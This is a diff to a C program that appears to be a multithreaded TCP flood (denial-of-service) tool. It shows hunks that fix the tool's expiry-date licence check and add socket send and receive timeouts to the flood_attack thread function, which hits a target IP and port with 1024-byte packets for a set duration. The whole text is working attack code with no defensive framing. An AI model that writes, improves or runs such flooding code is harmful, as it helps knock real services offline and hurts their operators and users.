@@ -9,8 +9,9 @@
 #include <netinet/in.h>
 
 #define PACKET_SIZE 1024         // Size of each packet in bytes
-#define MAX_RETRIES 3           // Max number of retries if attack fails
+#define MAX_RETRIES 3            // Max number of retries if attack fails
 #define EXPIRY_DATE "2025-03-20" // Expiration date
+#define TIMEOUT_SECONDS 5        // Connection timeout in seconds
 
 // Global variables for IP, Port, Duration, and Thread count
 char *target_ip = NULL;
@@ -25,8 +26,8 @@ int is_expired() {
 
     // Set the expiry date to March 20, 2025
     expiry_tm.tm_year = 2025 - 1900; // Year since 1900
-    expiry_tm.tm_mon = 3;            // Month (0-11)
-    expiry_tm.tm_mday = 10;          // Day of the month
+    expiry_tm.tm_mon = 2;            // Month (0-11)
+    expiry_tm.tm_mday = 20;          // Day of the month
 
     time(&now);
     // Compare current time with expiry time
@@ -40,8 +41,7 @@ void* flood_attack(void* thread_id) {
     char data[PACKET_SIZE];
     int retries = 0;
     int success = 0;
-    time_t start_time;
-    time_t end_time;
+    struct timeval timeout;
 
     while (retries < MAX_RETRIES && !success) {
         sock = socket(AF_INET, SOCK_STREAM, 0);
@@ -49,6 +49,16 @@ void* flood_attack(void* thread_id) {
             perror("Socket creation failed");
             retries++;
             continue;  // Retry on failure
+        }
+
+        // Set timeout for the socket
+        timeout.tv_sec = TIMEOUT_SECONDS;
+        timeout.tv_usec = 0;
+        if (setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&timeout, sizeof(timeout)) < 0) {
+            perror("Failed to set send timeout");
+        }
+        if (setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout)) < 0) {
+            perror("Failed to set receive timeout");
         }
 
         server_addr.sin_family = AF_INET;
@@ -64,8 +74,8 @@ void* flood_attack(void* thread_id) {
         }
 
         // Start sending packets
-        start_time = time(NULL);
-        end_time = start_time + attack_duration;
+        time_t start_time = time(NULL);
+        time_t end_time = start_time + attack_duration;
 
         while (time(NULL) <= end_time) {
             // Calculate remaining time
